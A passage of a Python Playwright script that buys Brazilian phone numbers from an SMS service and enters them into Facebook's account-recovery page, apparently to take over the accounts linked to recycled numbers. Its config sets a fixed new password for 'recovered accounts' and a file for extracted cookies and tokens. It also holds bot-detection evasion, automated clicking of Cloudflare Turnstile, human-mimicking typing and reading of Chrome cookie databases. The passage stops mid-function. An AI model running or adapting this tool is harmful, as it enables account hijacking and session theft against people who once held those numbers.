"""
Attach to an already logged-in Chrome session, buy a Hero SMS number, copy it,
and paste/fill it into another authorized page.

Setup:
1. Install dependencies:
   python -m pip install playwright pyperclip
   python -m playwright install chromium

2. Start Chrome with remote debugging enabled. Close existing Chrome windows
   first if this command opens a fresh, logged-out profile:
   chrome.exe --remote-debugging-port=9222 --user-data-dir="%USERPROFILE%\\chrome-automation"

3. Log in to Hero SMS in that Chrome window.

3. Store your Hero SMS login in environment variables:
   PowerShell, current window only:
   $env:HERO_SMS_USERNAME="your@email.com"
   $env:HERO_SMS_PASSWORD="your-password"

4. Edit CONFIG below, then run:
   python hero_sms_automation.py
"""

from __future__ import annotations

import os
import re
import time
import sys
import shutil
import json
from dataclasses import dataclass

# Force stdout/stderr to use UTF-8 encoding
if hasattr(sys.stdout, 'reconfigure'):
    try:
        sys.stdout.reconfigure(encoding='utf-8')
    except Exception:
        pass
if hasattr(sys.stderr, 'reconfigure'):
    try:
        sys.stderr.reconfigure(encoding='utf-8')
    except Exception:
        pass

import pyperclip
from playwright.sync_api import Page, sync_playwright

def check_stop_flag() -> None:
    flag_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "stop.flag")
    if os.path.exists(flag_path):
        try:
            os.remove(flag_path)
        except:
            pass
        raise KeyboardInterrupt("Stop signal detected")

def update_daily_stats(recovered: int = 0, spent: float = 0.0, duration: int = 0, failed_logins: int = 0) -> None:
    try:
        from datetime import datetime
        import json
        today_str = datetime.now().strftime("%Y-%m-%d")
        stats_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "recovered_stats.json")
        
        data = {}
        if os.path.exists(stats_path):
            with open(stats_path, "r", encoding="utf-8") as f:
                try:
                    raw_data = json.load(f)
                    for k, v in raw_data.items():
                        if isinstance(v, dict):
                            data[k] = v
                        else:
                            data[k] = {
                                "recovered": int(v),
                                "spent": 0.0,
                                "duration": 0,
                                "failed_logins": 0
                            }
                except:
                    pass
                    
        entry = data.setdefault(today_str, {"recovered": 0, "spent": 0.0, "duration": 0, "failed_logins": 0})
        entry["recovered"] += recovered
        entry["spent"] += spent
        entry["duration"] += duration
        entry.setdefault("failed_logins", 0)
        entry["failed_logins"] += failed_logins
        
        with open(stats_path, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=4)
    except Exception as e:
        print(f"Could not record daily statistic: {e}")

def is_chrome_running() -> bool:
    try:
        import subprocess
        if sys.platform == 'win32':
            out = subprocess.check_output("tasklist /FI \"IMAGENAME eq chrome.exe\"", shell=True, text=True)
            return "chrome.exe" in out.lower()
        else:
            out = subprocess.check_output("pgrep -f chrome", shell=True, text=True)
            return bool(out.strip())
    except Exception:
        return False

def close_chrome_on_port(port: int) -> None:
    try:
        import subprocess
        if sys.platform == 'win32':
            cmd = f'for /f "tokens=5" %a in (\'netstat -aon ^| findstr :{port} ^| findstr LISTENING\') do taskkill /F /PID %a'
            subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            subprocess.run(f"fuser -k {port}/tcp", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        print(f"Could not force close Chrome process on port {port}: {e}")

def get_official_chrome_user_data_dir() -> str:
    if sys.platform == 'win32':
        return os.path.expandvars(r"%LocalAppData%\Google\Chrome\User Data")
    elif sys.platform == 'darwin':
        return os.path.expanduser("~/Library/Application Support/Google/Chrome")
    else:
        return os.path.expanduser("~/.config/google-chrome")

def is_profile_logged_in(profile_path: str) -> bool:
    cookie_paths = [
        os.path.join(profile_path, "Network", "Cookies"),
        os.path.join(profile_path, "Cookies"),
        os.path.join(profile_path, "Default", "Network", "Cookies"),
        os.path.join(profile_path, "Default", "Cookies")
    ]
    for path in cookie_paths:
        if os.path.exists(path):
            try:
                import sqlite3
                import tempfile
                import shutil
                
                temp_dir = tempfile.gettempdir()
                temp_cookie_path = os.path.join(temp_dir, f"temp_cookies_check_{os.path.basename(profile_path)}.db")
                try:
                    shutil.copy2(path, temp_cookie_path)
                except Exception:
                    temp_cookie_path = path
                    
                conn = sqlite3.connect(temp_cookie_path)
                cursor = conn.cursor()
                cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='cookies'")
                if not cursor.fetchone():
                    conn.close()
                    continue
                cursor.execute("SELECT name FROM cookies WHERE host_key LIKE '%facebook.com%' AND name='c_user'")
                row = cursor.fetchone()
                conn.close()
                if row:
                    return True
            except Exception as e:
                # If cookie file exists but reading it throws error (e.g. locked db), 
                # assume it is logged in/unsafe to prevent session hijacking
                return True
    return False


def generate_next_profile_name(user_data_dir: str = None) -> str:
    official_path = get_official_chrome_user_data_dir()
    standalone_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "chrome_profiles")
    standalone_fb_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "chrome_profiles_fb")
    
    existing_profiles = set()
    max_num = 1
    
    # Scan all directories including the Facebook standalone profile directory
    for directory in [official_path, standalone_path, standalone_fb_path]:
        if directory and os.path.exists(directory):
            try:
                for item in os.listdir(directory):
                    if os.path.isdir(os.path.join(directory, item)):
                        match = re.match(r"^Profile\s*(\d+)$", item, re.I)
                        if match:
                            num = int(match.group(1))
                            existing_profiles.add(num)
                            if num > max_num:
                                max_num = num
            except Exception:
                pass

    main_profile = getattr(CONFIG, 'chrome_profile_name', 'Default')
    
    # 1. Proactively check existing profiles to see if we can reuse an empty/logged-out one!
    for i in sorted(list(existing_profiles)):
        profile_folder_name = f"Profile {i}"
        
        # Never hijack the main profile that is running Hero SMS
        if profile_folder_name.lower() == main_profile.lower():
            continue
            
        standalone_dir = os.path.join(standalone_path, profile_folder_name)
        standalone_fb_dir = os.path.join(standalone_fb_path, profile_folder_name)
        official_dir = os.path.join(official_path, profile_folder_name)
        
        is_logged = False
        if os.path.exists(standalone_dir):
            is_logged = is_logged or is_profile_logged_in(standalone_dir)
        if os.path.exists(standalone_fb_dir):
            is_logged = is_logged or is_profile_logged_in(standalone_fb_dir)
        if os.path.exists(official_dir):
            is_logged = is_logged or is_profile_logged_in(official_dir)
            
        if not is_logged:
            # We must also make sure it is not currently open/locked by Chrome
            lock_file = os.path.join(standalone_fb_dir, "lockfile")
            if os.path.exists(lock_file):
                continue
                
            print(f"ℹ️ Reusing clean existing profile folder: '{profile_folder_name}'")
            return profile_folder_name

    # 2. If all existing profiles are occupied, generate a brand new one starting above the highest index
    next_num = max_num + 1
    while True:
        profile_folder_name = f"Profile {next_num}"
        if profile_folder_name.lower() == main_profile.lower():
            next_num += 1
            continue
            
        standalone_dir = os.path.join(standalone_path, profile_folder_name)
        standalone_fb_dir = os.path.join(standalone_fb_path, profile_folder_name)
        official_dir = os.path.join(official_path, profile_folder_name)
        
        if not os.path.exists(standalone_dir) and not os.path.exists(standalone_fb_dir) and not os.path.exists(official_dir):
            print(f"ℹ️ Generated fresh unused profile: '{profile_folder_name}'")
            return profile_folder_name
        next_num += 1

def launch_and_connect_chrome(p, port: int, profile_name: str, user_data_subdir: str = "chrome_profiles"):
    import subprocess
    import sys
    import time
    
    is_running = is_chrome_running()
    is_standalone = False
    
    if is_running:
        # Each profile gets its own completely isolated User Data Directory to prevent cross-profile tracking
        user_data_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), user_data_subdir, profile_name)
        os.makedirs(user_data_dir, exist_ok=True)
        is_standalone = True
        print(f"Chrome is running. Launching standalone profile '{profile_name}' in {user_data_dir}...")
        
        # Sync official profile directory to standalone Default folder for session preservation
        official_profile_dir = os.path.join(get_official_chrome_user_data_dir(), profile_name)
        standalone_profile_dir = os.path.join(user_data_dir, "Default")
        if os.path.exists(official_profile_dir):
            print(f"Syncing official profile '{profile_name}' to standalone for session preservation...")
            try:
                import shutil
                if os.path.exists(standalone_profile_dir):
                    shutil.rmtree(standalone_profile_dir)
                shutil.copytree(official_profile_dir, standalone_profile_dir)
                print("Profile synced successfully.")
            except Exception as e:
                print(f"⚠️ Could not sync official profile: {e}")
    else:
        user_data_dir = get_official_chrome_user_data_dir()
        print(f"Chrome is not running. Launching official profile '{profile_name}'...")
        
    # Find Playwright's clean bundled Chromium executable first
    playwright_chrome_path = None
    try:
        import glob
        local_appdata = os.environ.get("LOCALAPPDATA", "")
        matches = glob.glob(os.path.join(local_appdata, "ms-playwright", "chromium-*", "chrome-win", "chrome.exe"))
        if matches:
            playwright_chrome_path = matches[0]
            print(f"✨ Found Playwright bundled Chromium: {playwright_chrome_path}")
    except Exception:
        pass
        
    paths = []
    if playwright_chrome_path:
        paths.append(playwright_chrome_path)
    paths.extend([
        r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
        os.path.expandvars(r"%LocalAppData%\Google\Chrome\Application\chrome.exe"),
        r"C:\Program Files\Google\Chrome\chrome.exe",
        r"C:\Program Files (x86)\Google\Chrome\chrome.exe",
    ])
    chrome_path = None
    for p_path in paths:
        if os.path.exists(p_path):
            chrome_path = p_path
            break
    if not chrome_path:
        chrome_path = "chrome.exe"
        
    close_chrome_on_port(port)
    
    profile_dir_flag = "Default" if is_running else profile_name
    cmd = [
        chrome_path,
        f"--remote-debugging-port={port}",
        f"--user-data-dir={user_data_dir}",
        f"--profile-directory={profile_dir_flag}",
        "--no-first-run",
        "--skip-first-run-ui",
        "--no-default-browser-check",
        "--disable-features=ProfilePicker",
        "--disable-features=Translate"
    ]
    
    creation_flags = 0
    if sys.platform == 'win32':
        creation_flags = subprocess.CREATE_NEW_CONSOLE
        
    print(f"Launching Chrome on port {port}...")
    subprocess.Popen(cmd, creationflags=creation_flags)
    time.sleep(3)
    
    browser = p.chromium.connect_over_cdp(f"http://127.0.0.1:{port}")
    context = browser.contexts[0] if browser.contexts else browser.new_context()
    
    try:
        context.add_init_script("""
            // 1. Hide navigator.webdriver
            Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined,
            });

            // 2. Mock window.chrome
            const mockChrome = {
                app: {
                    isInstalled: false,
                    InstallState: { DISABLED: 'disabled', INSTALLED: 'installed', NOT_INSTALLED: 'not_installed' },
                    RunningState: { CANNOT_RUN: 'cannot_run', READY_TO_RUN: 'ready_to_run', RUNNING: 'running' }
                },
                runtime: {
                    OnInstalledReason: { CHROME_UPDATE: 'chrome_update', INSTALL: 'install', SHARED_MODULE_UPDATE: 'shared_module_update', UPDATE: 'update' },
                    OnRestartRequiredReason: { APP_UPDATE: 'app_update', OS_UPDATE: 'os_update', PERIODIC: 'periodic' },
                    PlatformArch: { ARM: 'arm', ARM64: 'arm64', MIPS: 'mips', MIPS64: 'mips64', X86_32: 'x86-32', X86_64: 'x86-64' },
                    PlatformNaclArch: { ARM: 'arm', MIPS: 'mips', X86_32: 'x86-32', X86_64: 'x86-64' },
                    PlatformOs: { ANDROID: 'android', CROS: 'cros', LINUX: 'linux', MAC: 'mac', OPENBSD: 'openbsd', WIN: 'win' },
                    RequestUpdateCheckStatus: { NO_UPDATE: 'no_update', THROTTLED: 'throttled', UPDATE_AVAILABLE: 'update_available' }
                }
            };
            Object.defineProperty(window, 'chrome', {
                get: () => mockChrome
            });

            // 3. Mock permissions
            const originalQuery = window.navigator.permissions.query;
            window.navigator.permissions.query = (parameters) => (
                parameters.name === 'notifications' ?
                    Promise.resolve({ state: Notification.permission }) :
                    originalQuery(parameters)
            );

            // 4. Mock languages & plugins
            Object.defineProperty(navigator, 'languages', {
                get: () => ['en-US', 'en'],
            });
            Object.defineProperty(navigator, 'plugins', {
                get: () => [1, 2, 3, 4, 5],
            });
        """)
    except Exception as e:
        print(f"⚠️ Could not inject stealth scripts: {e}")
        
    return browser, context, is_standalone

def sync_profile_to_official(profile_name: str) -> None:
    import shutil
    import json
    
    standalone_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "chrome_profiles", profile_name)
    official_dir = os.path.join(get_official_chrome_user_data_dir(), profile_name)
    
    if not os.path.exists(standalone_dir):
        print(f"Standalone profile folder not found: {standalone_dir}")
        return
        
    print(f"Syncing standalone profile '{profile_name}' to official User Data directory...")
    
    try:
        if os.path.exists(official_dir):
            shutil.rmtree(official_dir)
        shutil.copytree(standalone_dir, official_dir)
        print("Profile folder copied successfully.")
    except Exception as e:
        print(f"Could not copy profile folder: {e}")
        return
        
    local_state_path = os.path.join(get_official_chrome_user_data_dir(), "Local State")
    if os.path.exists(local_state_path):
        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                data = json.load(f)
                
            profiles = data.setdefault("profile", {}).setdefault("info_cache", {})
            profile_entry = profiles.setdefault(profile_name, {})
            profile_entry["name"] = f"FB - Recovered"
            
            with open(local_state_path, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=4)
            print("Registered profile in Chrome Local State successfully.")
        except Exception as e:
            print(f"Could not update Local State: {e}")

def login_if_needed(context) -> None:
    username = os.environ.get("HERO_SMS_USERNAME") or CONFIG.hero_username
    password = os.environ.get("HERO_SMS_PASSWORD") or CONFIG.hero_password
    
    if not username or not password:
        print("HERO_SMS_USERNAME or HERO_SMS_PASSWORD not set in config/env. Skipping auto-login.")
        return
        
    page = context.pages[0] if context.pages else context.new_page()
    page.goto(CONFIG.hero_url)
    page.bring_to_front()

    if already_logged_in(page):
        print("Already logged in.")
        return

    try:
        login_btn = page.locator("a:has-text('Login / Register'), button:has-text('Log in'), a:has-text('Log in'), button:has-text('Login / Register')").first
        if login_btn.is_visible(timeout=5000):
            login_btn.click(timeout=5000)
            time.sleep(1.5)
            print("Clicked Login / Register button to open login form.")
        else:
            print("Login / Register button not visible, assuming login form is already open.")
    except Exception as e:
        print(f"Log in button click skipped or failed: {e}")
    
    print("Filling in email...")
    email_input = page.locator("input[type='email'], input[name='email'], input[placeholder*='email' i]").first
    email_input.wait_for(state="visible", timeout=12000)
    email_input.fill(username)
    time.sleep(0.5)
    
    print("Filling in password...")
    password_input = page.locator("input[type='password'], input[name='password'], input[placeholder*='password' i]").first
    password_input.wait_for(state="visible", timeout=8000)
    password_input.fill(password)
    time.sleep(0.5)
    
    print("Checking for Cloudflare Turnstile verification...")
    try:
        turnstile_iframe = page.locator("iframe").first
        turnstile_iframe.wait_for(state="visible", timeout=15000)
        print("Cloudflare Turnstile iframe detected! Attempting click...")
        
        frame = turnstile_iframe.content_frame()
        checkbox_selector = "#challenge-stage, .ct-checkbox, input[type='checkbox'], #challenge-container"
        checkbox = frame.locator(checkbox_selector).first
        
        checkbox.wait_for(state="attached", timeout=10000)
        checkbox.hover(timeout=3000)
        time.sleep(0.8)
        checkbox.click(timeout=3000, force=True)
        print("Hovered and clicked Cloudflare Turnstile checkbox automatically.")
    except Exception as e:
        print(f"Could not automatically click Turnstile checkbox: {e}")
        print("Please manually click the 'Verify you are human' checkbox in the Chrome window if it doesn't auto-verify.")

    print("Waiting for Cloudflare verification to be solved...")
    verified = False
    start_wait = time.time()
    
    while time.time() - start_wait < 180:
        if already_logged_in(page):
            verified = True
            break
        try:
            token = page.locator("[name='cf-turnstile-response']").first.evaluate("el => el.value")
            if token and len(token.strip()) > 10:
                print("Cloudflare Turnstile verified (checkbox ticked)!")
                verified = True
                break
        except Exception:
            pass
        time.sleep(1.5)
        
    if verified:
        if already_logged_in(page):
            print("Login confirmed during verification!")
            return
            
        print("Waiting 5 seconds before clicking the 'Login' button to avoid bot detection...")
        time.sleep(5)
        
        print("Clicking 'Login' button...")
        try:
            submit_btn = page.locator("button[type='submit'], button:has-text('Login'), button:has-text('Log in')").first
            submit_btn.click(timeout=10000)
        except Exception as e:
            print(f"Failed to click Login button: {e}")
    else:
        print("Cloudflare verification timed out. Skipping automated click.")
    
    time.sleep(3)
    page.wait_for_load_state("networkidle", timeout=30_000)
    time.sleep(2)

    if already_logged_in(page):
        print("Login completed.")
        return

    if page.locator(CONFIG.password_selector).count() > 0:
        print("WARNING: Password field still visible. Continuing anyway.")
        return
    print("Login submitted. Continuing.")


def close_cookies_if_needed(page: Page) -> None:
    try:
        accept_btn = page.locator("button:has-text('Accept all cookies'), button:has-text('Accept cookies'), button:has-text('Accept'), button[class*='cookie'], .cookie-btn").first
        if accept_btn.is_visible(timeout=1000):
            accept_btn.click()
            time.sleep(0.5)
            print("🍪 Accepted cookie consent popup.")
    except Exception:
        pass


def ensure_menu_expanded(page: Page) -> None:
    close_cookies_if_needed(page)
    try:
        # Check if the purchases or get code links are already visible in desktop view
        purchases_btn = page.locator("a:has-text('My purchases'), a:has-text('Purchases'), button:has-text('My purchases')").first
        get_code_btn = page.locator("a:has-text('Get code'), button:has-text('Get code')").first
        
        # If both are hidden/not visible, it means the sidebar/hamburger menu needs to be opened
        if not purchases_btn.is_visible(timeout=1000) and not get_code_btn.is_visible(timeout=500):
            print("📱 Responsive view detected (menu is collapsed). Opening navigation drawer...")
            
            # Selectors targeting the top left hamburger menu toggle
            menu_btn = page.locator(
                "button[class*='menu'], button[class*='hamburger'], [class*='toggle-menu'], "
                "[class*='nav-icon'], header button, .header button, .navbar-toggle, "
                ".menu-btn, .hamburger, .header__burger, .nav-toggle, "
                "button:has(svg), header svg, [aria-label*='menu'], [aria-label*='navigation']"
            ).first
            
            if menu_btn.is_visible(timeout=1500):
                menu_btn.click(force=True)
                time.sleep(1) # wait for menu to expand
                print("Clicked hamburger menu button.")
            else:
                # Coordinate fallback for clicking top left area (header logo/menu area)
                print("⚠️ Hamburger button not found by selector. Trying coordinate click at top left (25, 25)...")
                page.mouse.click(25, 25)
                time.sleep(1.5)
    except Exception as e:
        print(f"⚠️ Error opening navigation menu: {e}")


def navigate_to_purchases(page: Page) -> bool:
    close_cookies_if_needed(page)
    print("\n🔍 Ensuring the 'Purchases' page is visible...")
    ensure_menu_expanded(page)
    try:
        purchases_btn = page.locator("a:has-text('My purchases'), a:has-text('Purchases'), button:has-text('My purchases')").first
        if purchases_btn.is_visible(timeout=2000):
            purchases_btn.click()
            time.sleep(2)
            print("✅ Navigated to Purchases page.")
            return True
    except Exception as e:
        print(f"⚠️ Could not navigate to Purchases: {e}")
    return False


def navigate_to_get_code(page: Page) -> bool:
    close_cookies_if_needed(page)
    print("\n🔍 Ensuring the 'Get code' page is visible...")
    ensure_menu_expanded(page)
    try:
        get_code_btn = page.locator("a:has-text('Get code'), button:has-text('Get code'), a:has-text('Get SMS'), button:has-text('Get SMS')").first
        if get_code_btn.is_visible(timeout=2000):
            get_code_btn.click()
            time.sleep(2)
            print("✅ Navigated to Get code page.")
            return True
    except Exception as e:
        print(f"⚠️ Could not navigate to Get code: {e}")
    return False


@dataclass(frozen=True)
class AutomationConfig:
    chrome_debug_url: str = "http://127.0.0.1:9222"

    # Login settings. Set auto_login False if you prefer to log in manually.
    auto_login: bool = False
    
    # Identify which Chrome profile is running this script (Useful if running multiple instances)
    chrome_profile_name: str = "Profile 1"
    
    # Set to True if you want it to loop indefinitely. False stops after 1 success.
    multiple_accounts: bool = False
    login_url: str = "https://hero-sms.com/"
    username_selector: str = "input.text-field__input"
    password_selector: str = "input[type='password'].text-field__input"
    submit_selector: str = "button.btn:has-text('Login'), button:has-text('Login')"
    logged_in_url_text: str = "hero-sms.com"
    logged_in_text: str = "My purchases"

    # Put the exact Hero SMS page URL here after you are logged in.
    hero_url: str = "https://hero-sms.com/"

    # Optional visible text to click. Leave blank if you prefer to choose these
    # manually in Chrome before the script buys/extracts the number.
    service_text: str = "Facebook"
    country_text: str = "Brazil"
    buy_text: str = "Buy for $0.099"

    # Target page where the number should be pasted. Use a page you own or are
    # authorized to automate.
    target_url: str = "https://www.facebook.com/login/identify/?ci=AdDhNqxj3bubeKaJl2BAeZF5R84lr1pqkL5Cf2GECCYUaKqqwnbEqH8-EmPr5ktGAoEAQ36l_A8pTW5y1b-Bnht-2xbUC9edHV1cW7O-udVnmbHAM1ZPy-PZmgDLgOHviiToDLhpwlAxn0WywiZA6Y8Wyn-_n9oildrH-L31Wc8bBkOgGVO7udBoB-1zGQIygpu91hfBLtBXTilJ4JnkELUeSBYYFPVtNmnr6RLDvSZ2acPoDdiDrnAOgQOAsKE15PE6ztB0mkwvJZO-LZYfUJXpRt1u"
    target_phone_selector: str = "input[name='email'], input[id='identify_email'], input[type='text'], input[type='tel']"
    
    # Password to set for recovered accounts. If left blank, a random one will be generated.
    new_password: str = "HeroSmsRecover123!"
    # File to save the extracted cookies and tokens
    output_file: str = "recovered_accounts.txt"
    
    # Credentials for Hero SMS
    hero_username: str = ""
    hero_password: str = ""

    # If Hero SMS has a specific element for purchased numbers, set it here.
    # Otherwise the script searches page text for a phone-like number.
    purchased_number_selector: str = ""

    # Set True if you want the script to stop before buying so you can review.
    confirm_before_buy: bool = True
    vpn_connection_name: str = ""


def load_config() -> AutomationConfig:
    import json
    config_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.json")
    defaults = {
        "chrome_debug_url": "http://127.0.0.1:9222",
        "auto_login": False,
        "chrome_profile_name": "Profile 1",
        "multiple_accounts": False,
        "service_text": "Facebook",
        "country_text": "Brazil",
        "buy_text": "Buy for $0.099", # Overridden dynamically in execution loop
        "new_password": "HeroSmsRecover123!",
        "confirm_before_buy": True,
        "hero_username": "",
        "hero_password": "",
        "vpn_connection_name": ""
    }
    
    if os.path.exists(config_path):
        try:
            with open(config_path, "r", encoding="utf-8") as f:
                data = json.load(f)
                
            # If target_url is present, we map it too
            merged = defaults.copy()
            merged.update(data)
            
            return AutomationConfig(
                chrome_debug_url=merged.get("chrome_debug_url"),
                auto_login=merged.get("auto_login"),
                chrome_profile_name=merged.get("chrome_profile_name"),
                multiple_accounts=merged.get("multiple_accounts"),
                service_text=merged.get("service_text"),
                country_text=merged.get("country_text"),
                buy_text=merged.get("buy_text"),
                new_password=merged.get("new_password"),
                confirm_before_buy=merged.get("confirm_before_buy"),
                hero_username=merged.get("hero_username", ""),
                hero_password=merged.get("hero_password", ""),
                vpn_connection_name=merged.get("vpn_connection_name", "")
            )
        except Exception as e:
            print(f"⚠️ Could not load config.json, using defaults: {e}")
            
    return AutomationConfig()


CONFIG = load_config()


PHONE_RE = re.compile(r"(?<!\d)(?:\+?\d[\d\s().-]{7,}\d)(?!\d)")


def is_placeholder_url(url: str) -> bool:
    return not url.startswith("http") or "example.com" in url


def find_or_open_page(context, url_hint: str) -> Page:
    for page in context.pages:
        if url_hint and not is_placeholder_url(url_hint) and url_hint in page.url:
            return page

    page = context.new_page()
    if not is_placeholder_url(url_hint):
        page.goto(url_hint, wait_until="domcontentloaded")
    return page


def login_if_needed(context) -> None:
    if not CONFIG.auto_login:
        return

    if is_placeholder_url(CONFIG.login_url):
        print("Login URL is still a placeholder; skipping auto-login.")
        return

    username = os.environ.get("HERO_SMS_USERNAME", "").strip() or getattr(CONFIG, 'hero_username', "").strip()
    password = os.environ.get("HERO_SMS_PASSWORD", "") or getattr(CONFIG, 'hero_password', "")
    if not username or not password:
        raise RuntimeError(
            "Set HERO_SMS_USERNAME and HERO_SMS_PASSWORD in environment or config.json before running auto-login."
        )

    page = find_or_open_page(context, CONFIG.login_url)
    page.bring_to_front()

    if already_logged_in(page):
        print("Already logged in.")
        return

    # Click the Log in button to open the login form if needed (retry loop to handle JS load races)
    form_opened = False
    for click_attempt in range(5):
        try:
            if page.locator(CONFIG.username_selector).first.is_visible(timeout=1000):
                print("Login form is open.")
                form_opened = True
                break
        except Exception:
            pass
            
        print(f"Clicking Log in button (attempt {click_attempt+1})...")
        try:
            page.locator("a:has-text('Login / Register'):visible, button:has-text('Log in'):visible, a:has-text('Log in'):visible, .login-btn:visible").first.click(timeout=3000)
            time.sleep(2.0) # Wait slightly longer for animation/JS initialization
        except Exception as e:
            print(f"Log in button click failed: {e}")
            
    if not form_opened:
        print("⚠️ Warning: Login form could not be verified as open. Attempting to proceed anyway...")
    
    # Fill in credentials
    print("Filling in email...")
    page.locator(CONFIG.username_selector).first.fill(username, timeout=20_000)
    time.sleep(1.0)
    
    print("Filling in password...")
    page.locator(CONFIG.password_selector).first.fill(password, timeout=20_000)
    time.sleep(2.0)
    
    # 2. Find Cloudflare Turnstile verification widget and wait for human click/success
    print("⏳ Locating Cloudflare verification widget...")
    turnstile_frame = None
    
    # Poll up to 30 seconds to locate the Turnstile iframe
    for _ in range(30):
        for frame in page.frames:
            if "challenges.cloudflare.com" in frame.url or "turnstile" in frame.url:
                turnstile_frame = frame
                break
        if turnstile_frame:
            break
        time.sleep(1)
        
    if turnstile_frame:
        print("\n👇 CLOUDFLARE TURNSTILE DETECTED 👇")
        print("👉 Please manually click the 'Verify you are human' checkbox in the Chrome window.")
        print("👉 The bot will automatically detect when it succeeds and submit the form for you.")
        
        success_detected = False
        # Poll for up to 60 seconds for the user to solve it
        for sec in range(30):
            try:
                success_text = turnstile_frame.get_by_text("Success!", exact=False).first
                if success_text.is_visible(timeout=500):
                    print("\n🎉 Cloudflare Turnstile verification SUCCEEDED (Success! detected)!")
                    success_detected = True
                    break
            except:
                pass
            if sec > 0 and sec % 10 == 0:
                print(f"⏳ Still waiting for you to click the Turnstile checkbox (elapsed: {sec}s)...")
            time.sleep(1)
            
        if not success_detected:
            print("⚠️ Turnstile 'Success!' status not detected. Moving forward to click Login anyway...")
    else:
        print("ℹ️ No Cloudflare Turnstile widget detected.")
        
    # Wait another 5 seconds as requested by the user
    print("⏳ Waiting 5 seconds for verification token to settle...")
    time.sleep(5.0)
    
    # 5. Click the Login button
    print("🖱️ Clicking Login button...")
    try:
        page.locator(CONFIG.submit_selector).first.click(timeout=5000)
    except Exception as e:
        print(f"⚠️ Click Login button failed: {e}")
    
    # Wait for successful login (up to 30 seconds)
    print("⏳ Waiting for login verification (please solve Cloudflare Turnstile if prompted)...")
    for sec in range(30):
        if already_logged_in(page):
            print("🎉 Login completed successfully!")
            return
        if sec > 0 and sec % 5 == 0:
            try:
                submit_btn = page.locator(CONFIG.submit_selector).first
                if submit_btn.is_visible():
                    submit_btn.click()
            except Exception:
                pass
        time.sleep(1)
        
    if already_logged_in(page):
        print("🎉 Login completed successfully!")
    else:
        print("⚠️ Warning: Login check did not confirm success. Proceeding anyway.")


def already_logged_in(page: Page) -> bool:
    # If a Login / Register button is visible, we are definitely NOT logged in
    try:
        login_btn = page.locator("a:has-text('Login / Register'), button:has-text('Log in')").first
        if login_btn.is_visible(timeout=1000):
            return False
    except Exception:
        pass

    # If My purchases / Purchases is visible, we are logged in
    try:
        purchases_btn = page.locator("a:has-text('My purchases'), a:has-text('Purchases'), button:has-text('My purchases')").first
        if purchases_btn.is_visible(timeout=1000):
            return True
    except Exception:
        pass

    if CONFIG.logged_in_text:
        try:
            return page.get_by_text(
                re.compile(re.escape(CONFIG.logged_in_text), re.I)
            ).first.is_visible(timeout=1000)
        except Exception:
            return False

    return False


def click_visible_text(page: Page, text: str, timeout_ms: int = 10_000) -> None:
    if not text:
        return

    candidates = [
        page.get_by_role("button", name=re.compile(re.escape(text), re.I)),
        page.get_by_role("link", name=re.compile(re.escape(text), re.I)),
        page.get_by_text(re.compile(re.escape(text), re.I)).first,
    ]

    last_error: Exception | None = None
    for locator in candidates:
        try:
            locator.click(timeout=timeout_ms)
            page.wait_for_load_state("networkidle", timeout=timeout_ms)
            return
        except Exception as exc:
            last_error = exc

    raise RuntimeError(f"Could not click visible text {text!r}") from last_error


def get_top_number(page: Page) -> str:
    """Helper to get the number currently at the top of the table."""
    try:
        cell = page.locator("tbody tr:first-child td:first-child").first
        if cell.is_visible(timeout=2000):
            return normalize_phone(cell.inner_text().strip())
    except:
        pass
    return ""


def extract_phone_number(page: Page, selector: str, previous_number: str = "") -> str:
    if selector:
        try:
            text = page.locator(selector).first.inner_text(timeout=20_000).strip()
            if text:
                return normalize_phone(text)
        except Exception:
            pass

    # Special handling for Hero SMS: look in the purchases table
    print("Looking for phone number in purchases table dynamically...")
    time.sleep(3)  # Brief wait for purchase AJAX to process
    
    max_retries = 8 # increased retries for slow API
    retry_count = 0
    
    table_number = ""
    while retry_count < max_retries:
        try:
            # Wait for table to be visible
            # Match first data cell in tbody, or fallback to first table cell/card
            table_row = page.locator("tbody tr:first-child td:first-child, table tr:nth-child(2) td:first-child, .purchases-table td:first-child, td[data-title*='number']").first
            
            # Get the text
            table_number = table_row.inner_text(timeout=5_000).strip()
            
            print(f"Attempt {retry_count + 1}: Extracted text: '{table_number}'")
            
            # Check if it's a valid phone number (should have + and digits)
            if table_number and len(table_number) > 5 and ('+' in table_number or any(c.isdigit() for c in table_number)):
                normalized = normalize_phone(table_number)
                
                # Check if it's the exact same number as before we clicked buy
                if previous_number and normalized == previous_number:
                    print(f"⚠️ Still seeing the previous number '{normalized}'. API is slow. Waiting for new one...")
                else:
                    print(f"✅ Found valid NEW number: {normalized}")
                    return normalized
            else:
                print(f"❌ Invalid or empty number: '{table_number}'.")
                
        except Exception as e:
            print(f"Error reading table: {e}")
        
        retry_count += 1
        if retry_count < max_retries:
            print(f"Waiting 4 seconds before next attempt...")
            time.sleep(4)
            # Hero SMS sometimes gets stuck on "The list is empty." unless refreshed
            if "The list is empty" in table_number or retry_count == 2 or retry_count == 5:
                print("Reloading page to force table refresh...")
                try:
                    page.reload(wait_until="domcontentloaded")
                except Exception:
                    pass
                time.sleep(3)
    
    # If we still don't have a number, raise error
    raise RuntimeError("Could not extract a valid NEW phone number from the Hero SMS purchases table.")


def normalize_phone(value: str) -> str:
    value = value.strip()
    value = re.sub(r"\s+", " ", value)
    return value


def human_type(element, text: str):
    import random
    element.focus()
    element.click()
    time.sleep(random.uniform(0.15, 0.35))
    element.press("Control+A")
    element.press("Backspace")
    time.sleep(random.uniform(0.1, 0.2))
    
    for char in text:
        element.type(char)
        time.sleep(random.uniform(0.08, 0.22)) # random keystroke delay between 80ms and 220ms


def human_click(element, timeout_ms=10000):
    import random
    element.scroll_into_view_if_needed(timeout=timeout_ms)
